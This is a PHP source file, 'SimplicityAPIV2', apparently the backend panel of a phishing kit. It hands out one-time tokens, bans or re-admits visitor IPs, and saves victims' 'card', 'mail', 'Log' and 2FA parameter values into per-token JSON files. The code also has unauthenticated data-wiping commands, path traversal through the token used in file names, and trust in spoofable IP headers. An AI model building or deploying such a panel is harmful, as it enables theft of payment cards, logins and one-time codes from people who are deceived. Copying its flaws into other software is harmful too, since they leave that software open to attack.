# SimplicityAPIV2

<?php
// CORS headers
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET");
header("Access-Control-Allow-Headers: Content-Type");

function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

function isIPBlacklisted($ip) {
    $blacklist = file('blacklist.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($ip, $blacklist);
}

function isIPInList($ip) {
    $ipsList = file('ips.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($ip, $ipsList);
}

function addIPToList($ip) {
    file_put_contents('ips.txt', $ip . PHP_EOL, FILE_APPEND);
}

function addIPToBlacklist($ip) {
    file_put_contents('blacklist.txt', $ip . PHP_EOL, FILE_APPEND);
}

function readdIP($ip) {
    $ipsList = file('ips.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $ipsList)) {
        return true;
    } else {
        file_put_contents('ips.txt', $ip . PHP_EOL, FILE_APPEND);
        return false;
    }
}

function isTokenActive($token) {
    $activeTokens = file('active.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($token, $activeTokens);
}

function moveTokenToInactive($token) {
    $activeTokens = file('active.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $newActiveTokens = array_diff($activeTokens, [$token]);
    file_put_contents('active.txt', implode(PHP_EOL, $newActiveTokens) . PHP_EOL);
    file_put_contents('inactive.txt', $token . PHP_EOL, FILE_APPEND);
}

function createTokenJsonFile($token, $ip, $userAgent, $referer, $card, $mail, $data1) {
    // Prepare data to update or create JSON file
    $userData = [
        "Token" => $token,
        "Ip" => $ip,
        "UserAgent" => $userAgent,
        "Referer" => $referer,
        "Status" => "undefined", // Changed from "Log" to "Status" with default value "undefined"
        "Log" => "undefined", // Default value for "Log"
        "card" => "undefined", // Default value for "card"
        "mail" => "undefined", // Default value for "mail"
        "data1" => "undefined", // Default value for "data1"
    ];

    // Check if the token file exists, if so, load its contents
    $filename = __DIR__ . "/users/{$token}.json";
    if (file_exists($filename)) {
        $jsonContent = file_get_contents($filename);
        $userData = json_decode($jsonContent, true);
    }

    // Update the JSON data based on GET parameters
    if (isset($_GET['log'])) {
        $userData['Log'] = $_GET['log'];
    }
    if (isset($_GET['card'])) {
        $userData['card'] = $_GET['card'];
    }
    if (isset($_GET['mail'])) {
        $userData['mail'] = $_GET['mail'];
    }
    if (isset($_GET['data1'])) {
        $userData['data1'] = $_GET['data1'];
    }

    // Encode the updated data back to JSON
    $jsonContent = json_encode($userData, JSON_PRETTY_PRINT);

    // Save the JSON file
    file_put_contents($filename, $jsonContent);

    // Handle 2FA file
    $filename2fa = __DIR__ . "/2fa/{$token}.json";
    if (file_exists($filename2fa)) {
        $jsonContent2fa = file_get_contents($filename2fa);
        $data2fa = json_decode($jsonContent2fa, true);
    } else {
        $data2fa = [
            "Token" => $token,
            "Updated" => "NO",
            "par1" => "undefined",
            "par2" => "undefined",
            "par3" => "undefined",
            "par4" => "undefined",
            "par5" => "undefined",
            "par6" => "undefined"
        ];
    }

    // Update 2FA data based on GET parameters if necessary
    // (Implement as needed similar to the above JSON update)

    // Save the 2FA JSON file
    $jsonContent2fa = json_encode($data2fa, JSON_PRETTY_PRINT);
    file_put_contents($filename2fa, $jsonContent2fa);
}

function clearFiles() {
    // Clear or create necessary files
    $files = ['ips.txt', 'blacklist.txt', 'active.txt', 'inactive.txt'];

    foreach ($files as $file) {
        if (file_exists($file)) {
            file_put_contents($file, '');
        } else {
            touch($file);
        }
    }

    // Clear 2fa directory
    $directory = __DIR__ . "/2fa";
    if (is_dir($directory)) {
        $files2fa = glob($directory . '/*'); // get all file names
        foreach ($files2fa as $file) { // iterate files
            if (is_file($file)) {
                unlink($file); // delete file
            }
        }
    } else {
        mkdir($directory, 0777, true);
    }
}

// Handle different commands via GET parameters
if (isset($_GET['token'])) {
    $token = $_GET['token'];
    $ip = getClientIP();
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

    $response = [];

    // Check if IP was already in ips.txt (readded)
    if (readdIP($ip)) {
        $response['Readded'] = 'YES';
        $response['Ban'] = 'NO';
        $response['Token'] = 'readded'; // Response when readded
    } else {
        $response['Readded'] = 'NO';

        // Check if IP is blacklisted
        if (isIPBlacklisted($ip)) {
            $response['Ban'] = 'YES';
            $response['Token'] = 'readded'; // Response when banned
        } else {
            $response['Ban'] = 'NO';

            // Check if token is active
            if (isTokenActive($token)) {
                $response['Token'] = '200ok';
                moveTokenToInactive($token);

                // Create JSON files with updated data
                createTokenJsonFile($token, $ip, $userAgent, $referer, $_GET['card'] ?? '', $_GET['mail'] ?? '', $_GET['data1'] ?? '');
            } else {
                $response['Token'] = 'denied';
            }
        }
    }

    // Return JSON response
    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    $response = [];

    // Readd IP to list if not already present
    if (readdIP($ip)) {
        $response['Readded'] = 'YES';
        $response['Ban'] = 'NO';
        $response['Token'] = 'readded'; // Response when readded
    } else {
        $response['Readded'] = 'NO';
        addIPToList($ip);

        // Check if IP is blacklisted
        if (isIPBlacklisted($ip)) {
            $response['Ban'] = 'YES'; // IP found in blacklist
        } else {
            $response['Ban'] = 'NO'; // IP not found in blacklist
        }
    }

    // Return JSON response
    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['addb'])) {
    $ip = $_GET['addb'];
    addIPToBlacklist($ip);
    $response = ['status' => '200ok'];

    // Return JSON response
    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['clear'])) {
    // Clear all files
    clearFiles();
    $response = ['status' => 'Files cleared'];

    // Return JSON response
    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['status'])) {
    // Return 200 OK status
    $response = ['status' => '200 OK'];

    // Return JSON response
    header('Content-Type: application/json');
    echo json_encode($response);
} elseif (isset($_GET['user'])) {
    // Handle editing JSON file based on user command
    $token = $_GET['user'];
    $filename = __DIR__ . "/users/{$token}.json";

    if (file_exists($filename)) {
        // Load existing JSON content
        $jsonContent = file_get_contents($filename);
        $userData = json_decode($jsonContent, true);

        // Update JSON fields based on GET parameters
        if (isset($_GET['log'])) {
            $userData['Log'] = $_GET['log'];
        }
        if (isset($_GET['card'])) {
            $userData['card'] = $_GET['card'];
        }
        if (isset($_GET['mail'])) {
            $userData['mail'] = $_GET['mail'];
        }
        if (isset($_GET['data1'])) {
            $userData['data1'] = $_GET['data1'];
        }

        // Encode updated data back to JSON
        $jsonContent = json_encode($userData, JSON_PRETTY_PRINT);
        file_put_contents($filename, $jsonContent);

        // Return success response
        $response = ['message' => 'Variables updated successfully', 'status' => '200 OK'];
    } else {
        // Handle case where token file doesn't exist
        $response = ['error' => 'Token not found', 'status' => '404 Not Found'];
    }

    // Return JSON response
    header('Content-Type: application/json');
    echo json_encode($response);
} else {
    // Handle invalid request
    header('Content-Type: application/json');
    echo json_encode(['error' => 'Invalid request']);
}
?>
